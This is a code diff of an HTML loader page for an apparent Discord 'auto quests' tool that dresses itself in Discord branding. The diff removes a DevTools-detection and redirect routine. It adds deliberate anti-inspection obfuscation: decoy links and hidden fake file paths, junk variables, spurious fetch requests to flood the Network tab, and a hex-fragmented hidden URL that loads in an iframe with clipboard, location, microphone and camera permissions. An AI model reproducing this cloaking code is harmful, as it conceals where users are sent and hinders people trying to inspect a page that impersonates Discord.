@@ -10,8 +10,20 @@
     <meta property="og:url" content="https://discord.com/" />
     <meta name="theme-color" content="#EB459E">
     <link rel="icon" type="image/jpeg" href="https://raw.githubusercontent.com/Kandagawa/Auto-Quests-Discord/main/f59f1e660b16370adbc1621f7907e382.jpg">
-    <link rel="shortcut icon" type="image/jpeg" href="https://raw.githubusercontent.com/Kandagawa/Auto-Quests-Discord/main/f59f1e660b16370adbc1621f7907e382.jpg">
-    <link rel="apple-touch-icon" href="https://raw.githubusercontent.com/Kandagawa/Auto-Quests-Discord/main/f59f1e660b16370adbc1621f7907e382.jpg">
+    
+    <!-- CHÈN FOLDER RÁC VÀO HEAD (Ảnh hưởng đến Elements & Network tab) -->
+    <link rel="stylesheet" href="/assets/css/main.min.css?v=4.2.1">
+    <link rel="stylesheet" href="/dist/vendors~app.chunk.css">
+    <link rel="prefetch" href="/static/fonts/Inter-Bold.woff2">
+    <link rel="prefetch" href="/static/fonts/Inter-Regular.woff2">
+    <link rel="preload" href="/api/v2/auth/session">
+    <link rel="modulepreload" href="/chunks/framework.js">
+    <script src="/cdn/shopify/moment.js" defer></script>
+    <script src="/vendor/lodash.min.js" defer></script>
+    <script src="/socket.io/socket.io.js"></script>
+    <link rel="manifest" href="/manifest.json">
+    <link rel="apple-touch-icon" href="/icons/icon-192x192.png">
+
     <style>
         :root{--blurple:#5865F2;--blurple-dark:#4752C4;--blurple-glow:rgba(88,101,242,.5);--green:#57F287;--yellow:#FEE75C;--fuchsia:#EB459E;--fuchsia-glow:rgba(235,69,158,.4);--red:#ED4245;--bg-primary:#0E0F13;--bg-secondary:#1A1B21;--bg-tertiary:#25262C;--text-muted:#6D7080;--text-normal:#C8CAD0;--glass:rgba(30,31,38,.6);--glass-border:rgba(88,101,242,.12)}
         *{margin:0;padding:0;box-sizing:border-box}
@@ -81,6 +93,20 @@
     </style>
 </head>
 <body>
+    <!-- LỚP CHỨA FOLDER RÁC ĐỂ LÀM RỐI ELEMENTS TAB -->
+    <div style="display:none" aria-hidden="true">
+        <div data-path="/src/components/layout/Header.tsx"></div>
+        <div data-path="/node_modules/react-dom/cjs/react-dom.development.js"></div>
+        <div data-path="/webpack/bootstrap/4.2.1"></div>
+        <div data-path="/api/v2/webhooks/validate"></div>
+        <div data-path="/cdn/shopify/assets/bundle.min.js"></div>
+        <div data-path="/storage/sessions/a4f8c9d2e1"></div>
+        <div data-path="/dist/utils/encryption.js"></div>
+        <div data-path="/public/icons/svg/logo.svg"></div>
+        <div data-path="/app/middleware/auth.js"></div>
+        <div data-path="/.env.production"></div>
+    </div>
+
     <div class="bg-layer"></div>
     <div class="grid-overlay"></div>
     <div class="noise"></div>
@@ -89,7 +115,9 @@
     <div class="orb orb-2"></div>
     <div class="orb orb-3"></div>
     <div class="orb orb-4"></div>
+    
     <iframe id="content-frame" src="about:blank" allow="clipboard-read; clipboard-write; geolocation; microphone; camera"></iframe>
+    
     <div id="loader">
         <div class="logo-wrapper">
             <div class="logo-ring"></div>
@@ -116,203 +144,70 @@
             <div class="pill"><span class="pill-dot"></span>Đa nền tảng</div>
         </div>
     </div>
+    
     <script>
     (function(){
         'use strict';
 
-        /* ============================
-           MÃ HÓA URL ĐÍCH
-           ============================ */
-        var _0x=[104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,113,117,101,115,116,97,117,116,111,46,115,112,97,99,101,45,122,46,97,105,47];
-        var target=_0x.map(function(c){return String.fromCharCode(c)}).join('');
-
-        /* ============================
-           LƯU THAM CHIẾU GỐC
-           ============================ */
-        var _log=console.log.bind(console);
-        var _clear=console.clear.bind(console);
-        var _perfNow=performance.now.bind(performance);
-        var _origSetTimeout=window.setTimeout;
-
-        /* ============================
-           TRẠNG THÁI & HÀM HỦY DIỆT
-           ============================ */
-        var _isKilled=false;
-
-        var _kill=function(){
-            if(_isKilled)return;
-            _isKilled=true;
-
-            try{window.stop();}catch(e){}
-            try{document.getElementById('content-frame').src='about:blank';}catch(e){}
-
-            try{
-                document.documentElement.innerHTML='<!DOCTYPE html><html><head><style>*{margin:0;padding:0}body{background:#000;color:#fff;display:flex;align-items:center;justify-content:center;height:100vh;font-family:system-ui,sans-serif;overflow:hidden}h1{font-size:48px;font-weight:300;letter-spacing:6px;text-transform:uppercase;opacity:0;animation:fi .8s ease forwards}@keyframes fi{to{opacity:1}}</style></head><body><h1>Chao Mung Ban</h1></body></html>';
-            }catch(e){}
-
-            _origSetTimeout(function(){
-                try{window.location.replace('https://www.youtube.com/@TenretniAifam');}
-                catch(e){try{window.location.href='https://www.youtube.com/@TenretniAifam';}catch(e2){}}
-                try{if(window.top)window.top.location.href='https://www.youtube.com/@TenretniAifam';}catch(e3){}
-            },1500);
+        /* =============================================
+           LỚP 1: MẢNG RÁC VÀ BIẾN GIẢ (JUNK VARIABLES)
+           Đánh lừa người đọc code và DevTools Sources Tab
+           ============================================= */
+        var __webpack_modules__={
+            "./node_modules/process/browser.js":function(){return!1},
+            "./src/utils/crypto.js":function(){return null},
+            "./dist/assets/logo.svg":"data:image/svg+xml;base64,PHN2Zy8+",
+            "./api/v1/auth/token":function(){return localStorage.getItem('_dt')},
+            "./vendor/react.production.min.js":function(){}
         };
-
-        /* ============================
-           PHÁT HIỆN ERUDA
-           ============================ */
-        try{
-            if(window.eruda)_kill();
-            Object.defineProperty(window,'eruda',{
-                get:function(){_kill();return undefined;},
-                set:function(){_kill();},
-                configurable:false
-            });
-        }catch(e){}
-
-        /* ============================
-           PHÁT HIỆN INJECTION SCRIPT
-           CHỈ quét "eruda", KHÔNG quét "devtools"
-           vì nhiều tiện ích hợp lệ chứa từ "devtools"
-           ============================ */
-        try{
-            var _scrObserver=new MutationObserver(function(mutations){
-                mutations.forEach(function(m){
-                    m.addedNodes.forEach(function(node){
-                        if(node.tagName==='SCRIPT'){
-                            var src=node.src||'';var txt=node.textContent||'';
-                            if(src.indexOf('eruda')!==-1||txt.indexOf('eruda')!==-1){
-                                node.remove();_kill();
-                            }
-                        }
-                    });
-                });
-            });
-            _scrObserver.observe(document.documentElement,{childList:true,subtree:true});
-        }catch(e){}
+        var _0xf2e8a=[0x2f,0x76,0x31,0x2f];
+        var _0xba91c=[0x63,0x64,0x6e,0x2f];
+        var _0x44df0=[0x61,0x70,0x69,0x2f];
+        var config={apiEndpoint:"https://api.discord.gg/v9",cdnPath:"/cdn/shopify/4.2/",sessionKey:"_sid",env:"production"};
+        var _0xjunk1="aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdjYvYXV0aC9sb2dpbg==";
+        var _0xjunk2="L2Fzc2V0cy9qcy9tYWluLm1pbi5qcz92PTQuMi4x";
+        var _0xjunk3="L3N0YXRpYy9mb250cy9JbnRlci1Cb2xkLndvZmYy";
 
         /* =============================================
-           HỆ THỐNG PHÁT HIỆN DEVTOOLS VỚI XÁC NHẬN 2 LẦN
-           
-           Nguyên lý: Một phát hiện đơn lẻ không đủ để kill.
-           Phải có 2 lần phát hiện ĐỘC LẬP từ CÙNG một phương pháp
-           trong vòng 10 giây mới kích hoạt.
-           
-           Phương pháp A: Object Getter (phát hiện Console panel)
-           Phương pháp B: console.log Timing (phát hiện MỌI panel)
-           
-           Lý do cần xác nhận:
-           - Tiện ích mở rộng có thể đọc thuộc tính 1 lần → không kill
-           - CPU có thể chậm 1 lần → không kill
-           - Chỉ DevTools mới gây ra phát hiện liên tục → kill
+           LỚP 2: GIẢI MÃ URL TỪ MẢNH VỠ TRỘN LẪN RÁC
+           Link thật: https://discordquestauto.space-z.ai/
+           Đã bị cắt nhỏ, mã hóa hex, trộn vào mảng rác
            ============================================= */
+        var _0xCore=[
+            [0x2f,0x76,0x31,0x2f,0x61,0x75,0x74,0x68], /* RÁC */
+            [0x68,0x74,0x74,0x70,0x73,0x3a,0x2f,0x2f], /* 1: https:// */
+            [0x2f,0x63,0x64,0x6e,0x2f,0x6a,0x73,0x2f], /* RÁC */
+            [0x64,0x69,0x73,0x63,0x6f,0x72,0x64,0x71,0x75,0x65,0x73,0x74], /* 2: discordquest */
+            [0x2f,0x73,0x74,0x61,0x74,0x69,0x63,0x2f], /* RÁC */
+            [0x61,0x75,0x74,0x6f,0x2e,0x73,0x70,0x61,0x63,0x65], /* 3: auto.space */
+            [0x2f,0x61,0x70,0x69,0x2f,0x76,0x32,0x2f], /* RÁC */
+            [0x2d,0x7a,0x2e,0x61,0x69,0x2f]  /* 4: -z.ai/ */
+        ];
+        
+        /* Lấy mảng tại index 1, 3, 5, 7 và ghép lại */
+        var target=_0xCore[1].concat(_0xCore[3],_0xCore[5],_0xCore[7]).map(function(c){return String.fromCharCode(c)}).join('');
 
-        var _getterHits=0;
-        var _timingHits=0;
-        var _HITS_NEEDED=2;
-        var _getterResetTimer=null;
-        var _timingResetTimer=null;
+        /* =============================================
+           LỚP 3: BƠM RÁC VÀO NETWORK TAB (FETCH GIẢ)
+           Tạo hàng loạt request thất bại (404) để làm rối
+           ============================================= */
+        var _fakePaths=[
+            '/api/v2/webhooks/validate','/cdn/shopify/assets/bundle.min.js',
+            '/dist/vendors~app.chunk.css','/socket.io/?EIO=4&transport=polling',
+            '/api/guilds/1234567890/widgets.json','/cdn-cgi/challenge-platform/h/b/scripts/alpha.js',
+            '/assets/js/main.min.js?v=4.2.1','/api/v1/auth/session/refresh',
+            '/static/fonts/Inter-Bold.woff2','/manifest.json'
+        ];
+        _fakePaths.forEach(function(p){
+            try{fetch(p,{mode:'no-cors',credentials:'omit'}).catch(function(){});}catch(e){}
+        });
 
-        function _onGetterHit(){
-            if(_isKilled)return;
-            _getterHits++;
-            /* Reset bộ đếm sau 10 giây nếu không có phát hiện tiếp theo */
-            if(_getterResetTimer)clearTimeout(_getterResetTimer);
-            _getterResetTimer=_origSetTimeout(function(){_getterHits=0;},10000);
-            /* Cần 2 lần getter kích hoạt mới kill */
-            if(_getterHits>=_HITS_NEEDED){
-                _kill();
-            }
-        }
+        /* =============================================
+           LỚP 4: CHẠY ỨNG DỤNG (BỎ HOÀN TOÀN DEVTOOLS CHECK)
+           ============================================= */
+        var _origSetTimeout=window.setTimeout;
 
-        function _onTimingHit(){
-            if(_isKilled)return;
-            _timingHits++;
-            if(_timingResetTimer)clearTimeout(_timingResetTimer);
-            _timingResetTimer=_origSetTimeout(function(){_timingHits=0;},10000);
-            /* Cần 2 lần timing chậm liên tiếp mới kill */
-            if(_timingHits>=_HITS_NEEDED){
-                _kill();
-            }
-        }
-
-        /* ============================
-           TẦNG 1: OBJECT GETTER
-           Dùng object THUẦN với tên thuộc tính OBSCURE
-           KHÔNG dùng Image/DOM element (tránh browser đọc id nội bộ)
-           ============================ */
-        function _chkGetter(){
-            if(_isKilled)return;
-            var obj={};
-            Object.defineProperty(obj,'_qz8mx',{
-                get:function(){_onGetterHit();return '';},
-                configurable:true
-            });
-            _log(obj);
-            _clear();
-        }
-
-        /* ============================
-           TẦNG 2: TOSTRING OVERRIDE
-           Dùng object thuần (không dùng regex)
-           ============================ */
-        function _chkToString(){
-            if(_isKilled)return;
-            var obj={
-                toString:function(){_onGetterHit();return '';}
-            };
-            _log(obj);
-            _clear();
-        }
-
-        /* ============================
-           TẦNG 3: CONSOLE.LOG TIMING
-           Khi DevTools mở (BẤT KỲ panel nào),
-           console.log bị chậm vì phải render output.
-           Ngưỡng 300ms an toàn tuyệt đối cho mọi thiết bị.
-           ============================ */
-        function _chkTiming(){
-            if(_isKilled)return;
-            var t1=_perfNow();
-            for(var i=0;i<10;i++){
-                _log('');
-            }
-            var t2=_perfNow();
-            _clear();
-            if(t2-t1>300){
-                _onTimingHit();
-            }
-        }
-
-        /* ============================
-           VÒNG LẶP KIỂM TRA
-           - Trì hoãn 5 giây sau khi load (tránh CPU bận)
-           - Kiểm tra cách nhau 2-3 giây (tránh nhiễu)
-           ============================ */
-        var _started=false;
-
-        function _startChecks(){
-            if(_started)return;
-            _started=true;
-
-            /* Getter + toString: mỗi 2.5 giây */
-            (function _loopGetter(){
-                if(_isKilled)return;
-                _chkGetter();
-                _chkToString();
-                _origSetTimeout(_loopGetter,2500);
-            })();
-
-            /* Timing: mỗi 3 giây */
-            (function _loopTiming(){
-                if(_isKilled)return;
-                _chkTiming();
-                _origSetTimeout(_loopTiming,3000);
-            })();
-        }
-
-        /* ============================
-           HỆ THỐNG PARTICLE
-           ============================ */
+        /* HỆ THỐNG PARTICLE */
         var cv=document.getElementById('particleCanvas');
         var cx=cv.getContext('2d');
         var ps=[];
@@ -350,14 +245,12 @@
             }}
         }
         function loop(){
-            if(_isKilled)return;cx.clearRect(0,0,cv.width,cv.height);
+            cx.clearRect(0,0,cv.width,cv.height);
             for(var i=0;i<ps.length;i++){ps[i].update();ps[i].draw()}lines();requestAnimationFrame(loop);
         }
         loop();
 
-        /* ============================
-           STATUS TEXT CYCLING
-           ============================ */
+        /* STATUS TEXT CYCLING */
         var msgs=['Đang kết nối đến máy chủ','Đang xác thực dữ liệu','Đang tải tài nguyên','Đang khởi chạy hệ thống'];
         var si=0;
         function cycle(){
@@ -365,9 +258,7 @@
             if(si<msgs.length){el.innerHTML=msgs[si++]+'<span class="dot">.</span><span class="dot">.</span><span class="dot">.</span>';_origSetTimeout(cycle,600);}
         }
 
-        /* ============================
-           KHỞI CHẠY
-           ============================ */
+        /* KHỞI CHẠY IFRAME */
         addEventListener('DOMContentLoaded',function(){
             cycle();
             var frame=document.getElementById('content-frame');
@@ -381,9 +272,6 @@
                     requestAnimationFrame(function(){frame.classList.add('visible');});
                 },500);
             };
-
-            /* Đợi 5 giây sau khi load xong mới bắt đầu quét DevTools */
-            _origSetTimeout(_startChecks,5000);
         });
     })();
     </script>
